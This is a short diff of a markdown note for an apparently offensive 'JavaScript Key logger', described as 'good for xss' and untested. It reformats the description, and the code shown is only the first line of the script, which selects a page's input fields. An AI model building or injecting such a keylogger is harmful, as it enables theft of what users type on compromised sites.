@@ -1,7 +1,7 @@
 JavaScript Key logger
 --------------------------
-# Log key stokes using js, good for xss
-# has not been tested yet.
+Log key stokes using js, good for xss
+has not been tested yet.
 
 ```javascript
 var input = document.querySelectorAll("input");
